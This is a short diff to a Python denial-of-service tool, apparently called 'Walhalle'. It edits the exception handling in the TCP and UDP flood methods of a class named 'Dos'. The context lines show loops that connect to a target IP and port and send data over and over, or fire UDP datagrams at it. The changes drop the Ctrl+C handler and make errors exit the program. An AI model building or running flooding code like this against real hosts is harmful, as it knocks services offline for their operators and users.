@@ -32,10 +32,7 @@ class Dos():
                     sock.connect((ip, port))
                     sock.send(data)
             except Exception:
-                print("Error")
-                continue
-            except KeyboardInterrupt:
-                print("Walhalle Closed - you pressed ctrl+c")
+                print("Error in TCP")
                 sys.exit(0)
 
     def udp_flood(self, ip, port, buffer_size):
@@ -45,10 +42,7 @@ class Dos():
                 with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                     sock.sendto(data, (ip, port))
             except Exception:
-                print("Error")
-                continue
-            except KeyboardInterrupt:
-                print("Walhalle Closed - you pressed ctrl+c")
+                print("Error in UDP")
                 sys.exit(0)
 
 class Controller(Dos):
